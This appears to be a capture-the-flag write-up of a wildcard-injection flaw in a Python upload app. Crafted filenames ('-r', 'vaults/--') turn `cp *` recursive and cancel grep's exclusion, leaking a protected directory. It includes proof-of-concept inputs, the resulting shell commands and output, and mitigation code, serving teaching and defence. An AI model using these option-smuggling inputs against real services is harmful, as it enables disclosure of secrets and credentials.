# Vulnerability Report DOJO 49

---

## Linux Wildcard Injection in `cp *` leading to Sensitive File Disclosure

The application uses an unsafe `cp *` shell command to back up uploaded files into a vault directory. By crafting filenames that are interpreted as shell options, an attacker can make `cp` copy the protected `internal_secrets/` directory into the vault, and then inject a `--` argument into `grep` to neutralize the `--exclude-dir=internal_secrets` protection, ultimately leaking the flag.

---

## Root Cause — Step-by-Step Breakdown

The vulnerability chain occurs across two insecure shell invocations:

```python
# Backing up the changes to vaults
os.chdir(UPLOAD_FOLDER)
os.system(f'cp * {VAULT_FOLDER} 2>/dev/null')  # (1) Wildcard injection in cp

# Later, in the search action:
os.chdir(VAULT_FOLDER)
result = os.popen(f'grep -r "{grep}" * --exclude-dir=internal_secrets 2>/dev/null').read()  # (2) Wildcard injection in grep
```

### Step 1 — Wildcard injection into `cp` via a filename named `-r`

The attacker creates a file literally named `-r` in the upload folder. When the shell expands `cp *`, it becomes:

```bash
cp -r extracted internal_secrets user_secrets.txt vaults /tmp/uploads/vaults/
```

The `-r` flag is now active, so `cp` copies the `internal_secrets/` directory **recursively** into the vault:

```
/tmp/uploads/vaults/internal_secrets/flag.txt  ← now accessible
```

### Step 2 — Pre-placing a `--` file in the vault via path traversal

The filename validation only blocks paths starting with `/` or containing `..`. A path like `vaults/--` passes all checks:

```python
if filename.startswith('/'):   # ❌ blocked
elif '\\' in filename or '..' in filename:  # ❌ blocked
# 'vaults/--' → passes ✅
```

So the attacker creates a file named `vaults/--`, which writes directly to `/tmp/uploads/vaults/--`.

### Step 3 — `--` neutralizes `--exclude-dir` in `grep`

After `cp *` runs, the vault contains:

```
--                        ← our injected file
extracted/
internal_secrets/         ← copied by -r
user_secrets.txt
vaults/
```

When `grep` runs from `VAULT_FOLDER`, the shell expands `*` and `--` ends up as an argument **before** `--exclude-dir=internal_secrets`:

```bash
grep -r "FLAG" -- extracted internal_secrets user_secrets.txt vaults --exclude-dir=internal_secrets
```

In shell, `--` signals **end of options** — everything after it is treated as a positional argument (a file/directory to search), including `--exclude-dir=internal_secrets`. That argument is now treated as a filename, which doesn't exist, so it's silently ignored. `grep` then searches `internal_secrets/` without any exclusion and finds the flag.

---

## Impact

An unauthenticated attacker can read **any file** inside the `internal_secrets/` directory, including:

- Secret flags
- Admin credentials (`admin_credentials.txt`)
- Any other sensitive files placed there

---

## Proof of Concept

**Inputs:**

| Field | Value |
|---|---|
| `action` | `search` |
| `filenames` | `-r vaults/--` |
| `content` | *(empty)* |
| `grep` | `FLAG` |

**Equivalent Python:**

```python
action    = unquote("search")
filenames = unquote("-r vaults/--").split()
content   = unquote("")
grep      = unquote("FLAG")
```

**Server-side commands triggered:**

```bash
# Step 1: cp becomes recursive, copies internal_secrets/ into vault
cp -r extracted internal_secrets user_secrets.txt vaults /tmp/uploads/vaults/

# Step 2: grep's --exclude-dir is neutralized by --
grep -r "FLAG" -- extracted internal_secrets user_secrets.txt vaults --exclude-dir=internal_secrets
```

**Output:**

```
Search results for 'FLAG':
internal_secrets/flag.txt:<FLAG>
```

**Flag:** `<FLAG>`

---

## Mitigation

### 1. Never use shell wildcards with user-controlled filenames

```python
# ❌ Vulnerable
os.system(f'cp * {VAULT_FOLDER}')

# ✅ Safe — use Python's shutil instead
import shutil
for filename in os.listdir(UPLOAD_FOLDER):
    src = os.path.join(UPLOAD_FOLDER, filename)
    dst = os.path.join(VAULT_FOLDER, filename)
    if os.path.isfile(src):
        shutil.copy2(src, dst)
```

### 2. Validate filenames with a strict allowlist

```python
import re

def is_safe_filename(filename):
    # Only allow simple filenames, no path separators
    return bool(re.fullmatch(r'[a-zA-Z0-9._-]+', filename))

for filename in filenames:
    if not is_safe_filename(filename):
        raise ValueError(f"Invalid filename: {filename}")
```

### 3. Never pass user-controlled data into shell glob commands

```python
# ❌ Vulnerable — * expands user-created files as arguments
os.popen(f'grep -r "{grep}" * --exclude-dir=internal_secrets')

# ✅ Safe — use Python's grep equivalent
import subprocess
result = subprocess.run(
    ['grep', '-r', grep, '.', '--exclude-dir=internal_secrets'],
    capture_output=True, text=True, cwd=VAULT_FOLDER
)
```

### 4. Sanitize filenames at write time

```python
import os

def safe_join(base, filename):
    # Resolve the real path and ensure it stays within base
    target = os.path.realpath(os.path.join(base, filename))
    if not target.startswith(os.path.realpath(base) + os.sep):
        raise ValueError("Path traversal detected")
    return target
```

---

## Vulnerability Classification

| Field | Value |
|---|---|
| **Type** | Linux Wildcard Injection / Path Traversal |
| **Vector** | Filename input → shell glob expansion |
| **Impact** | Sensitive file disclosure |
| **Authentication** | Not required |
| **CWE** | CWE-78 (OS Command Injection), CWE-22 (Path Traversal) |